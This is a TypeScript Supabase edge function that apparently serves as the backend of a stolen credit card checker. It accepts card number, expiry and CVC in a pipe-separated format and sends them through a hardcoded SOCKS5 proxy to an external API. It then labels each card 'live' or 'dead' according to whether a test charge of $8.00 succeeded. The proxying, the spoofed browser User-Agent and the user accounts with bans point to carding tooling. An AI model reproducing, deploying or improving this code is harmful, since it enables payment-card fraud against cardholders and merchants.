import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
import { createClient } from "https://esm.sh/@supabase/supabase-js@2";

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers": "authorization, x-client-info, apikey, content-type",
  "Access-Control-Allow-Methods": "POST, OPTIONS",
};

const SUPABASE_URL = Deno.env.get("SUPABASE_URL")!;
const SUPABASE_ANON_KEY = Deno.env.get("SUPABASE_ANON_KEY")!;

// API Configuration
const API_BASE_URL = "http://web-production-7ad4f.up.railway.app/api";
const PROXY_IP = "138.197.124.55";
const PROXY_PORT = "9150";
const PROXY_TYPE = "sock5";

// Call the API and get response
const callApi = async (cc: string): Promise<{ status: string; message: string; rawResponse: string }> => {
  // Build URL exactly as specified: cc=CardNumber|MM|YY|CVC&proxy=IP:PORT&proxytype=sock5
  const apiUrl = `${API_BASE_URL}?cc=${encodeURIComponent(cc)}&proxy=${PROXY_IP}:${PROXY_PORT}&proxytype=${PROXY_TYPE}`;
  
  console.log(`[STRIPE-CHARGE] Calling API: ${apiUrl}`);
  
  try {
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 60000);
    
    const response = await fetch(apiUrl, {
      method: 'GET',
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': '*/*',
      },
      signal: controller.signal,
    });
    
    clearTimeout(timeoutId);
    
    const rawText = await response.text();
    console.log(`[STRIPE-CHARGE] Raw response: ${rawText}`);
    
    // Parse response
    let apiStatus = 'unknown';
    let apiMessage = rawText;
    
    try {
      const json = JSON.parse(rawText);
      apiMessage = json.message || json.msg || json.response || rawText;
      
      // Determine status from full_response field
      if (json.full_response === true) {
        apiStatus = 'live';
      } else if (json.full_response === false) {
        apiStatus = 'dead';
      } else if (json.status) {
        const s = String(json.status).toLowerCase();
        if (s.includes('live') || s.includes('success') || s.includes('charged')) {
          apiStatus = 'live';
        } else if (s.includes('dead') || s.includes('decline') || s.includes('fail')) {
          apiStatus = 'dead';
        }
      }
    } catch {
      // Not JSON, check text
      const lower = rawText.toLowerCase();
      if (lower.includes('charged') || lower.includes('success') || lower.includes('approved')) {
        apiStatus = 'live';
      } else if (lower.includes('declined') || lower.includes('invalid') || lower.includes('expired')) {
        apiStatus = 'dead';
      }
    }
    
    return { status: apiStatus, message: apiMessage, rawResponse: rawText };
    
  } catch (error) {
    const errMsg = error instanceof Error ? error.message : 'Request failed';
    console.error(`[STRIPE-CHARGE] API error: ${errMsg}`);
    
    return { status: 'unknown', message: errMsg, rawResponse: errMsg };
  }
};

serve(async (req) => {
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    // Auth check
    const authHeader = req.headers.get("Authorization");
    if (!authHeader?.startsWith("Bearer ")) {
      return new Response(
        JSON.stringify({ error: "Unauthorized" }),
        { status: 401, headers: { ...corsHeaders, "Content-Type": "application/json" } }
      );
    }

    const supabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY, {
      global: { headers: { Authorization: authHeader } },
    });

    const { data: { user }, error: authError } = await supabase.auth.getUser();
    if (authError || !user) {
      return new Response(
        JSON.stringify({ error: "Invalid token" }),
        { status: 401, headers: { ...corsHeaders, "Content-Type": "application/json" } }
      );
    }

    // Ban check
    const { data: profile } = await supabase
      .from("profiles")
      .select("is_banned")
      .eq("user_id", user.id)
      .single();

    if (profile?.is_banned) {
      return new Response(
        JSON.stringify({ error: "Account suspended" }),
        { status: 403, headers: { ...corsHeaders, "Content-Type": "application/json" } }
      );
    }

    // Get card from request
    const { cc } = await req.json();
    
    if (!cc) {
      return new Response(
        JSON.stringify({ error: 'Card required', computedStatus: 'unknown' }),
        { status: 400, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    // Validate format: CardNumber|MM|YY|CVC
    const parts = cc.split('|');
    if (parts.length < 4) {
      return new Response(
        JSON.stringify({ error: "Format: CardNumber|MM|YY|CVC", computedStatus: 'unknown' }),
        { status: 400, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    const cvc = parts[3];
    if (!cvc || cvc.length < 3 || !/^\d+$/.test(cvc)) {
      return new Response(
        JSON.stringify({ error: "Valid CVC required", computedStatus: 'unknown' }),
        { status: 400, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    console.log(`[STRIPE-CHARGE] Processing card: ${parts[0].slice(0, 6)}****`);

    // Call the API
    const result = await callApi(cc);
    
    // Return response to user
    return new Response(
      JSON.stringify({
        computedStatus: result.status,
        apiStatus: result.status === 'live' ? 'CHARGED' : result.status === 'dead' ? 'DECLINED' : 'UNKNOWN',
        apiMessage: result.message,
        apiTotal: '$8.00',
        status: result.status,
        message: result.message,
      }),
      { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
    );

  } catch (error) {
    const msg = error instanceof Error ? error.message : 'Unknown error';
    console.error('[STRIPE-CHARGE] Error:', msg);
    
    return new Response(
      JSON.stringify({ error: msg, computedStatus: "unknown" }),
      { status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
    );
  }
});
